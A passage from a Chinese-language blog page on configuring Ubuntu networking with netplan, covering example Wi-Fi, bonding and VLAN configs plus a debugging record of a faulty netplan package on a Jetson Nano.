+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  wifis:</span><br><span class="line">    wl0:</span><br><span class="line">      access-points:</span><br><span class="line">        workplace:</span><br><span class="line">          auth:</span><br><span class="line">            key-management: eap</span><br><span class="line">            method: ttls</span><br><span class="line">            anonymous-identity: &quot;@internal.example.com&quot;</span><br><span class="line">            identity: &quot;joe@internal.example.com&quot;</span><br><span class="line">            password: &quot;v3ryS3kr1t&quot;</span><br><span class="line">      dhcp4: yes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以下案例是 WPA-EAP 和 TLS加密无线网络:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  wifis:</span><br><span class="line">    wl0:</span><br><span class="line">      access-points:</span><br><span class="line">        university:</span><br><span class="line">          auth:</span><br><span class="line">            key-management: eap</span><br><span class="line">            method: tls</span><br><span class="line">            anonymous-identity: &quot;@cust.example.com&quot;</span><br><span class="line">            identity: &quot;cert-joe@cust.example.com&quot;</span><br><span class="line">            ca-certificate: /etc/ssl/cust-cacrt.pem</span><br><span class="line">            client-certificate: /etc/ssl/cust-crt.pem</span><br><span class="line">            client-key: /etc/ssl/cust-key.pem</span><br><span class="line">            client-key-password: &quot;d3cryptPr1v4t3K3y&quot;</span><br><span class="line">      dhcp4: yes</span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+<h2><span id="netplan-mac-spoof">netplan mac spoof</span></h2><blockquote>
+<p>如果使用 <code>networkd</code> 后端，则不支持wifi匹配，只能使用接口名字。以下为举例:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      dhcp4: yes</span><br><span class="line">      dhcp6: no</span><br><span class="line">      macaddress: xx:xx:xx:xx:xx:xx</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>如果使用NetworkManager后端，还可以采用 <code>match:</code> 方法:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      dhcp4: yes</span><br><span class="line">      dhcp6: no</span><br><span class="line">      match:</span><br><span class="line">        macaddress: yy:yy:yy:yy:yy:yy</span><br><span class="line">      macaddress: xx:xx:xx:xx:xx:xx</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="netplan配置bonding">netplan配置bonding</span></h2><h3><span id="简单active-backup-bonding">简单active-backup bonding</span></h3><blockquote>
+<ul>
+<li><p>参考原先安装虚拟机自动生成的 <code>/etc/netplan/50-cloud-init.yaml</code> 注释内容，禁用cloud-init网络配置，即创建 <code>/etc/cloud/cloud.cfg.d/99-disable-network-config.cfg</code> 内容如下:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network: &#123;config: disabled&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>备份原配置:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/netplan/50-cloud-init.yaml ~/</span><br><span class="line"><span class="built_in">cd</span> /etc/netplan</span><br><span class="line"><span class="built_in">rm</span> -f 50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>编辑 <code>/etc/netplan/01-netcfg.yaml</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">    ens38:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">  bonds:</span><br><span class="line">    bond0:</span><br><span class="line">      interfaces: <span class="section">[ens33, ens38]</span></span><br><span class="line">      parameters:</span><br><span class="line">        mode: active-backup</span><br><span class="line">        mii-monitor-interval: 1</span><br><span class="line">        primary: ens33</span><br><span class="line">      addresses: <span class="section">[192.168.161.10/24, ]</span></span><br><span class="line">      gateway4: 192.168.161.1</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: <span class="section">[127.0.0.53, ]</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+<h3><span id="bonding上增加vlan">bonding上增加VLAN</span></h3><blockquote>
+<ul>
+<li><p>编辑 <code>/etc/netplan/01-netcfg.yaml</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    eth0:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">    eth1:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">  bonds:</span><br><span class="line">    bond0:</span><br><span class="line">      interfaces: <span class="section">[eth0, eth1]</span></span><br><span class="line">      parameters:</span><br><span class="line">        mode: active-backup</span><br><span class="line">        mii-monitor-interval: 1</span><br><span class="line">        primary: eth0</span><br><span class="line">  vlans:</span><br><span class="line">    bond0.22:</span><br><span class="line">      id: 22</span><br><span class="line">      link: bond0</span><br><span class="line">      addresses: <span class="section">[ &quot;192.168.1.24/24&quot; ]</span></span><br><span class="line">      gateway4: 192.168.1.1</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: <span class="section">[ &quot;192.168.1.1&quot;, &quot;192.168.1.17&quot;, &quot;192.168.1.33&quot; ]</span></span><br><span class="line">        search: <span class="section">[ &quot;huatai.me&quot;, &quot;huatai.net&quot;, &quot;huatai.com&quot; ]</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>备注</strong></p>
+<p><a target="_blank" rel="noopener" href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/sec-using_channel_bonding">Red Hat Enterprise Linux 7 Networking Guide Using Channel Bonding</a> 提供了详细的参数设置，通常 <code>miimon=time_in_milliseconds</code> 设置 100 表示100ms，也就是 0.1s 。不过这里我参考netplan文档设置为1s。</p>
+<p>有关 VLAN over bonding配置请参考 <a target="_blank" rel="noopener" href="https://askubuntu.com/questions/1112288/netplan-configuring-2-vlan-on-same-bonding">Netplan - configuring 2 vlan on same bonding</a></p>
+</blockquote>
+<h2><span id="没有netplan配置systemd-networkd">没有netplan配置systemd-networkd</span></h2><blockquote>
+<p>实际上你可以不使用netplan也不使用NetworkManager就可以配置网络，因为 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/linux/redhat_linux/systemd/index.html#systemd">Systemd进程管理器</a> 实际上提供了完整的系统配置功能。默认启动的 <code>systemd-networkd</code> 接管了所有网络配置，所以手工添加配置也可以实现配置。</p>
+<p>所有的 <code>systemd-networkd</code> 配置位于 <code>/etc/systemd/network/</code> 目录下，例如， <code>enp0s25.network</code> 配置内容:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Match]</span></span><br><span class="line"><span class="attr">Name</span>=enp0s25</span><br><span class="line"></span><br><span class="line"><span class="section">[Network]</span></span><br><span class="line"><span class="attr">Address</span>=<span class="number">192.168</span>.<span class="number">6.9</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">GATEWAY</span>=<span class="number">192.168</span>.<span class="number">6.10</span></span><br><span class="line"><span class="attr">DNS</span>=<span class="number">192.168</span>.<span class="number">6.10</span></span><br></pre></td></tr></table></figure>
+
+<p>此时只需要重新加载一次 <code>systemd-networkd</code> 就可以:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart systemd-networkd</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="netplan问题排查">netplan问题排查</span></h2><blockquote>
+<p><strong>警告</strong></p>
+<p>netplan似乎不需要作为服务启动，而仅仅是作为一个前端工具，实际调用的是 networkd 和 NetworkManager来完成配置。我在Jetson Nano的Ubuntu 18.04使用netplan失败，似乎这个版本比较老，和现有netplan文档不能对齐，并且使用也很怪异，所以我还是使用 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/linux/ubuntu_linux/network/switch_nm.html#switch-nm">切换NetworkManager</a> 重新切回NetworkManager进行管理。</p>
+<p>以下是一些debug经验记录，仅供参考。</p>
+<p><a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/linux/ubuntu_linux/network/switch_nm.html#switch-nm">切换NetworkManager</a> 之后，我在 <a target="_blank" rel="noopener" href="https://cloud-atlas.readthedocs.io/zh-cn/latest/machine_learning/jetson/index.html#jetson">NVIDIA Jetson</a> 上将NetworkManager切换成netplan。但是，我发现 <code>netplan apply</code> 之后，网卡上并没有绑定静态配置的IP地址。虽然看上去 <code>/etc/netplan/01-netcfg.yaml</code> 和原先在树莓派上运行的Ubuntu 20.04没有什么区别:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    eth0:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      dhcp6: no</span><br><span class="line">      addresses: <span class="section">[192.168.6.10/24, ]</span></span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: <span class="section">[202.96.209.133, ]</span></span><br></pre></td></tr></table></figure>
+
+<p>既然使用 <code>networkd</code> 作为 <code>renderer</code> ，就应该生成 <code>systemd-networkd</code> 使用的配置文件，但是在 <code>/etc/systemd/network</code> 目录下没有生成任何配置文件。</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://bugs.launchpad.net/ubuntu/+source/netplan.io/+bug/1775566">networkd not applying config - missing events?</a> 可以看到，需要使用 <code>networkctl list</code> 查看一下网卡是否受到管理:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">networkctl list</span><br></pre></td></tr></table></figure>
+
+<p>果然，我输出显示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IDX LINK             TYPE               OPERATIONAL SETUP</span><br><span class="line">  1 lo               loopback           carrier     unmanaged</span><br><span class="line">  2 dummy0           ether              off         unmanaged</span><br><span class="line">  3 eth0             ether              routable    unmanaged</span><br><span class="line">  4 wlan0            wlan               off         unmanaged</span><br><span class="line">  5 l4tbr0           ether              off         unmanaged</span><br><span class="line">  6 rndis0           ether              no-carrier  unmanaged</span><br><span class="line">  7 usb0             ether              no-carrier  unmanaged</span><br></pre></td></tr></table></figure>
+
+<p>对比树莓派上 <code>networkctl list</code> 显示输出:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IDX LINK  TYPE     OPERATIONAL SETUP</span><br><span class="line">  1 lo    loopback carrier     unmanaged</span><br><span class="line">  2 eth0  ether    routable    configured</span><br><span class="line">  3 wlan0 wlan     routable    configured</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="networkctl">networkctl</span></h3><blockquote>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.freedesktop.org/software/systemd/man/networkctl.html">networkctl — Query the status of network links</a> <code>networkctl</code> 可以用于检查网络连线的状态是否被 <code>systemd-networkd</code> 看到。参考 <a target="_blank" rel="noopener" href="https://www.freedesktop.org/software/systemd/man/systemd-networkd.service.html#">systemd-networkd.service, systemd-networkd — Network manager</a> :</p>
+<ul>
+<li><code>systemd-networkd</code> 会管理在 <code>[Match]</code> 段落找到的 <code>.network</code> 文件中的任何连接来管理网络地址和路由。</li>
+<li>由于我执行 <code>netplan apply</code> 没有生成对应的 networkd 配置文件，所以导致网络没有配置</li>
+</ul>
+<p>我尝试先创建空的 <code>/etc/netplan</code> 目录，然后执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netplan -d generate</span><br></pre></td></tr></table></figure>
+
+<p>显示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netplan: netplan version 2.2 starting at Tue Oct 13 22:54:14 2020</span><br><span class="line">netplan: database directory is /var/lib/plan/netplan.dir</span><br><span class="line">netplan: user <span class="string">&quot;netplan&quot;</span> is uid 63434 gid 63434</span><br><span class="line">netplan: switching from user &lt;root&gt; to &lt;uid 63434 gid 63434&gt;</span><br><span class="line">netplan: running with uid=63434 gid=63434 euid=63434 egid=63434</span><br><span class="line">netplan: reading access list file /var/lib/plan/netplan.dir/.netplan-acl</span><br><span class="line">netplan: netplan/tcp not found <span class="keyword">in</span> /etc/services, using ports 2983 and 5444</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>仔细检查了 <code>systemctl status netplan</code> ，发现原因了：没有激活netplan daemon:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">● netplan.service - LSB: Netplan calendar service.</span><br><span class="line">   Loaded: loaded (/etc/init.d/netplan; generated)</span><br><span class="line">   Active: active (exited) since Tue 2020-10-13 21:12:52 CST; 1h 47min ago</span><br><span class="line">     Docs: man:systemd-sysv-generator(8)</span><br><span class="line">  Process: 4631 ExecStart=/etc/init.d/netplan start (code=exited, status=0/SUCCESS)</span><br><span class="line"></span><br><span class="line">10月 13 21:12:51 jetson systemd[1]: Starting LSB: Netplan calendar service....</span><br><span class="line">10月 13 21:12:52 jetson netplan[4631]: Netplan daemon not enabled <span class="keyword">in</span> /etc/init.d/netplan.</span><br><span class="line">10月 13 21:12:52 jetson systemd[1]: Started LSB: Netplan calendar service..</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>上述日志显示在 <code>/etc/init.d/netplan</code> 中没有激活netplan服务，所以实际该服务状态是 <code>active(exited)</code> ，也就是退出状态。</p>
+<p>编辑 <code>/etc/init.d/netplan</code> 文件，将:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set ENABLED=0 to disable, ENABLED=1 to enable.</span></span><br><span class="line">ENABLED=0</span><br></pre></td></tr></table></figure>
+
+<p>修改成:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set ENABLED=0 to disable, ENABLED=1 to enable.</span></span><br><span class="line">ENABLED=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后再次执行启动 <code>netplan</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start netplan</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>此时提示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: The unit file, <span class="built_in">source</span> configuration file or drop-ins of netplan.service changed on disk. Run <span class="string">&#x27;systemctl daemon-reload&#x27;</span> to reload units.</span><br></pre></td></tr></table></figure>
+
+<p>所以按照提示执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart netplan</span><br></pre></td></tr></table></figure>
+
+<p>启动之后再次检查 <code>systemctl status netplan</code> 则可以看到状态:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">● netplan.service - LSB: Netplan calendar service.</span><br><span class="line">   Loaded: loaded (/etc/init.d/netplan; generated)</span><br><span class="line">   Active: active (running) since Tue 2020-10-13 23:07:44 CST; 1min 8s ago</span><br><span class="line">     Docs: man:systemd-sysv-generator(8)</span><br><span class="line">  Process: 8386 ExecStop=/etc/init.d/netplan stop (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 8430 ExecStart=/etc/init.d/netplan start (code=exited, status=0/SUCCESS)</span><br><span class="line">    Tasks: 1 (<span class="built_in">limit</span>: 4174)</span><br><span class="line">   CGroup: /system.slice/netplan.service</span><br><span class="line">           └─8464 /usr/sbin/netplan</span><br><span class="line"></span><br><span class="line">10月 13 23:07:43 jetson systemd[1]: Starting LSB: Netplan calendar service....</span><br><span class="line">10月 13 23:07:44 jetson systemd[1]: Started LSB: Netplan calendar service..</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>但是比较奇怪，我执行 <code>netplan -d generate</code> 始终不生成配置文件，仅提示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netplan: netplan version 2.2 starting at Tue Oct 13 23:25:29 2020</span><br><span class="line">netplan: database directory is /var/lib/plan/netplan.dir</span><br><span class="line">netplan: user <span class="string">&quot;netplan&quot;</span> is uid 63434 gid 63434</span><br><span class="line">netplan: switching from user &lt;root&gt; to &lt;uid 63434 gid 63434&gt;</span><br><span class="line">netplan: running with uid=63434 gid=63434 euid=63434 egid=63434</span><br><span class="line">netplan: reading access list file /var/lib/plan/netplan.dir/.netplan-acl</span><br><span class="line">netplan: netplan/tcp not found <span class="keyword">in</span> /etc/services, using ports 2983 and 5444</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>根据 <a target="_blank" rel="noopener" href="http://manpages.ubuntu.com/manpages/cosmic/man8/netplan-generate.8.html">netplan-generate - generate backend configuration from netplan YAML files</a> 说明：</p>
+<ul>
+<li><code>netplan generate</code> 是根据 netplan 的 yaml配置来调用networkd后端或者NetworkManager后端来生成对应后端服务的配置文件</li>
+<li>通常不需要独立运行 <code>netplan generate</code> ，只需要运行 <code>netplan apply</code> 就可以，因为 <code>netplan apply</code> 会自动调用 <code>netplan generate</code> ，而 <code>netplan generate</code> 只是为了验证配置生成</li>
+<li><code>netplan</code> 会一次从以下3个位置读取配置文件，并且按照优先级，仅有一个位置的配置文件生效:<ul>
+<li><code>/run/netplan</code> 优先级最高</li>
+<li><code>/etc/netplan</code> 次优先级</li>
+<li><code>/lib/netplan</code> 最低优先级</li>
+</ul>
+</li>
+</ul>
+<p>参考 <a target="_blank" rel="noopener" href="https://netplan.io/troubleshooting/">netplan - Troubleshooting networking issues</a> 当出现配置不能生成，需要将后端服务器启动成debug模式。例如，我使用 <code>systemd-netowrkd</code> 则需要启用 <a target="_blank" rel="noopener" href="https://wiki.ubuntu.com/DebuggingSystemd">DebuggingSystemd</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop systemd-networkd</span><br><span class="line">SYSTEMD_LOG_LEVEL=debug /lib/systemd/systemd-networkd</span><br></pre></td></tr></table></figure>
+
+<p>但是我发现我执行 <code>netplan generate</code> 和 <code>netplan apply</code> 都没有任何影响，似乎就没有连接上。</p>
+<p>虽然手工可以创建一个 <code>/run/systemd/network/10-netplan-eth0.network</code> 填写内容:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Match]</span></span><br><span class="line"><span class="attr">Name</span>=eth0</span><br><span class="line"></span><br><span class="line"><span class="section">[Network]</span></span><br><span class="line"><span class="attr">LinkLocalAddressing</span>=ipv6</span><br><span class="line"><span class="attr">Address</span>=<span class="number">192.168</span>.<span class="number">6.10</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">DNS</span>=<span class="number">202.96</span>.<span class="number">209.133</span></span><br></pre></td></tr></table></figure>
+
+<p>配置创建后，执行 <code>networkctl</code> 就可以看到该eth0网卡是 <code>configured</code> ，似乎状态正常了。但是重启主机则网卡又是 <code>unmanaged</code> 并且 <code>/run/systemd/network</code> 目录又空了。</p>
+<p>发现一个蹊跷，执行 <code>netplan -d -v generate</code> 显示输出:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netplan: netplan version 2.2 starting at Wed Oct 14 09:46:03 2020</span><br><span class="line">netplan: database directory is /var/lib/plan/netplan.dir</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>为何显示数据库目录是 <code>/var/lib/plan/netplan.dir</code> ?</p>
+<p>我这个版本的netplan默认去读取了空白的 <code>/var/lib/plan/netplan.dir</code> ，这个和官方文档不同。我尝试移除这个目录:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib</span><br><span class="line"><span class="built_in">mv</span> plan plan.bak</span><br></pre></td></tr></table></figure>
+
+<p>再次启动 <code>netplan -d -v generate</code> 显示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netplan: netplan version 2.2 starting at Wed Oct 14 09:49:16 2020</span><br><span class="line">netplan: database directory is /var/lib/plan/netplan.dir</span><br><span class="line">netplan: user <span class="string">&quot;netplan&quot;</span> is uid 63434 gid 63434</span><br><span class="line">netplan: switching from user &lt;root&gt; to &lt;uid 63434 gid 63434&gt;</span><br><span class="line">netplan: running with uid=63434 gid=63434 euid=63434 egid=63434</span><br><span class="line">netplan: no <span class="built_in">read</span>/write access to /var/lib/plan/netplan.dir/.: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>这个版本的netplan可能是早期版本( 实践是在 Ubuntu 18 上，安装了 <code>netplan</code> 而没有安装更完整的 <code>netplan.io</code> 根据网友impl1874提供信息( <a target="_blank" rel="noopener" href="https://github.com/huataihuang/cloud-atlas/issues/10">use netplan.io please #10</a> )，需要通过完整安装 <code>netplan.io</code> 来修复这个问题。</p>
+<p>我在上文中补充说明，建议直接安装 <code>netplan.io</code> )，只能固定读取 <code>/var/lib/plan/netplan.dir/</code> ，不使用 <code>/etc/netplan</code> 目录，导致我配置无效。我还发现在 <code>/var/lib/plan/netplan.dir/</code> 有一个隐含文件:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.netplan-acl -&gt; /etc/plan/netplan-acl</span><br></pre></td></tr></table></figure>
+
+<p><strong>警告</strong></p>
+<p>上述排查是我早期的记录，当时安装的操作系统是 Ubuntu 18 LTS，安装的 <code>netplan</code> 存在bug，请完整安装 <code>netplan.io</code> 来避免这个问题。</p>
+<p>最新的 Ubuntu 20.04 LTS 默认即使用 <code>netplan.io</code> 没有这个问题。</p>
+</blockquote>
+<h2><span id="5g-hz无线网络连接">5G Hz无线网络连接</span></h2><blockquote>
+<p>在树莓派上配置了netplan的无线配置，配置文件 <code>/etc/netplan/02-wifi.yaml</code>:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  wifis:</span><br><span class="line">    wlan0:</span><br><span class="line">      optional: true</span><br><span class="line">      dhcp4: yes</span><br><span class="line">      dhcp6: no</span><br><span class="line">      access-points:</span><br><span class="line">        &quot;SSID-HOME&quot;:</span><br><span class="line">          password: &quot;home-passwd&quot;</span><br><span class="line">        &quot;SSID-OFFICE&quot;:</span><br><span class="line">          auth:</span><br><span class="line">            key-management: eap</span><br><span class="line">            identity: &quot;office.id&quot;</span><br><span class="line">            password: &quot;office-passwd&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是发现无线始终无法连接， <code>ip addr</code> 显示:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc fq_codel state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>使用 <code>iwconfig</code> 检查:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wlan0     IEEE 802.11  ESSID:off/any</span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=31 dBm</span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 <code>networkctl list</code> 检查发现:</p>
